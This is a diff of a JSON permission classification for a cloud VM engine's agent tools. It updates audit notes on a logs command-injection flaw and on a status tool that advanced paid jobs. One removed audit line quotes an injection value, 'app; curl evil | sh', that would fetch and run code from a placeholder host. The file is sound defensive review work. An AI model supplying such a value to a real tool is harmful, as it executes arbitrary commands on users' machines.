@@ -1,11 +1,11 @@
 {
-  "$comment": "Golden classification of every cloudru-vm engine tool -> permission action. METHOD (corrected 2026-08-10): permission=allow requires a BEHAVIOUR audit of the tool's engine handler (read the handle* in engine/internal/mcp at pinned baseline engineSha256) proving it passes BOTH hazard axes. AXIS 1 (read-only): genuinely read-only — no persistent state write (except a LOCAL plan file, noted per-entry), no downstream s.callTool, no job advancement, no secret material returned. AXIS 2 (SHELL-REACH, added AM-2 2026-08-10, cross-model QE HIGH): the handler does NOT pass any user-controlled argument into a shell/exec/SSH command (Deployer.Exec, session.CombinedOutput, a string-concatenated `docker …/kubectl …/compose …` command, or exec.Command). A tool that reaches a shell with a user arg is `ask` at MINIMUM — the brake can only set the permission, it CANNOT escape the arg (that is the engine's bug, not something the classifier can fix). The former shape heuristic ('no confirmed prop in schema => read-only') was FALSE-SAFE: stack_status had no confirmed prop yet advances jobs and invokes paid create tools (AXIS 1); `logs` was `allow` yet concatenates its user `service` arg RAW into a remote `docker compose logs <service>` over SSH — a command-injection/RCE path (AXIS 2, engine/logs.go:61 → ssh.go:117). Schema shape (confirmed prop) remains sufficient evidence for ask, never for allow. ENGINE INJECTION FLAGGED to the author (licence-blocked, NOT fixed here — see ADR-004 AM-2): the engine must shell-escape opts.Service and audit every `cmd +=` concatenation. Re-audit of ALL current allow tools against AXIS 2 found `logs` the ONLY shell-reaching allow tool; every other shell site (vm_exec, deploy, deploy_apply/captainkeys, k8s_kubectl/k8s_apply/k8s_helm) is already ask, and k8s_kubectl is additionally veto-hooked. Reclassifying a tool must show up in this diff (ADR-010 golden-snapshot discipline). A tool present in a live tools/list but absent here MUST fail the drift test — deny-by-default.",
-  "engineSha256": "59f83fc0678b95146ca539764d0c805bd2514b8588f198c1e835b26e54c05124",
+  "$comment": "Golden classification of every cloudru-vm engine tool. allow requires a BEHAVIOUR audit of the handler at the pinned engine SHA proving both axes: (1) observational with no cloud mutation, job advancement or secret return (a local plan write is disclosed), and (2) no user-controlled argument reaching shell/exec/SSH. Shell-reaching tools remain ask even when arguments are quoted. Schema shape alone never proves allow. The old baseline had two hazards: stack_status advanced planned jobs into paid actions and logs inserted an unescaped service into a shell command. In the pinned engine, stack_status reads persisted state only; stack_apply explicitly advances jobs, and logs shell-quotes service. The specific regression tests are in go/cloudru-vm/internal/mcp/stack_status_test.go and internal/engine/logs_test.go. Any unknown live tool fails drift checks; deny by default.",
+  "engineSha256": "89c5073418927ee71ac1de381eaba5ab69d599d615edc51b868d876e712dbf10",
   "toolCount": 144,
   "counts": {
-    "ask": 65,
+    "ask": 64,
     "deny": 2,
-    "allow": 77
+    "allow": 78
   },
   "tools": {
     "deploy": {
@@ -46,7 +46,7 @@
     "logs": {
       "effect": "shell-reach",
       "permission": "ask",
-      "why": "RECLASSIFIED allow→ask 2026-08-10 (AM-2, shell-reach hazard axis, cross-model QE HIGH): NOT read-only in the safe sense. handleLogs (tools.go:1758) passes the user-controlled `service` arg into engine.Logs, which CONCATENATES it RAW/unescaped into a remote shell command — `cmd += \" \" + opts.Service` (engine/logs.go:61) → e.Deployer.Exec (logs.go:64) → SSH session.CombinedOutput (internal/deploy/ssh.go:117). So service=\"app; curl evil | sh\" executes arbitrary commands on the user's VM: a command-injection/RCE path behind a silent allow, defeating the ADR-004 brake for an autonomous agent with cloud creds. The permission layer can only PROMPT; it cannot escape the arg (that is the engine's bug — flagged ADR-004 AM-2, licence-blocked). The prior audit's claim of a \"FIXED docker compose logs\" was WRONG: the command is NOT fixed."
+      "why": "shell-reach: handleLogs (tools.go:1758) passes user-controlled service to engine.Logs, which now shell-quotes it (engine/logs.go:61; regression internal/engine/logs_test.go). Still ask because it invokes remote SSH/compose and may return sensitive logs."
     },
     "destroy": {
       "effect": "mutating",
@@ -711,7 +711,7 @@
     "stack_plan": {
       "effect": "read-only",
       "permission": "allow",
-      "why": "behaviour-audited: creates NO cloud resource — handleStackPlan (tools_stack.go:297) plans and persists a LOCAL job file only (job.Save :318); its cloud calls are read-only (ListFlavors tools_stack.go:363, ListBuckets :396). Upstream smell: the saved planned job is later ADVANCED by stack_status — which is why stack_status is ask (see its entry)."
+      "why": "behaviour-audited: handleStackPlan (tools_stack.go:297) makes read-only lookups and persists a LOCAL planned job file only (job.Save); only stack_apply advances it."
     },
     "stack_apply": {
       "effect": "mutating",
@@ -719,9 +719,9 @@
       "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
     },
     "stack_status": {
-      "effect": "mutating",
-      "permission": "ask",
-      "why": "RECLASSIFIED allow→ask 2026-08-10 (cross-model QE HIGH, false-safe): handleStackStatus (tools_stack.go:451) calls s.advance() on planned/running jobs (:479-484); advance starts pending steps via s.callTool (:220) — i.e. it INVOKES the paid create tools (provision, pg_create, k8s_create, lb_create, …) with no confirmation. LIVE-REPRODUCED against baseline 59f83fc0: one stack_status call moved a planned job planned→running and attempted provision (stopped only at AUTH_REQUIRED). The fully-allow chain stack_plan→stack_status would provision a billable stack with ZERO prompts. Upstream design smell (engine, licence-blocked — not fixed here): a status poll on a NEVER-APPLIED job should not start spending."
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleStackStatus (tools_stack.go:451) loads and returns the persisted job; no advance, callTool, state write or cloud mutation. stack_apply is the explicit advancing action. Regression: internal/mcp/stack_status_test.go."
     },
     "stack_destroy": {
       "effect": "mutating",
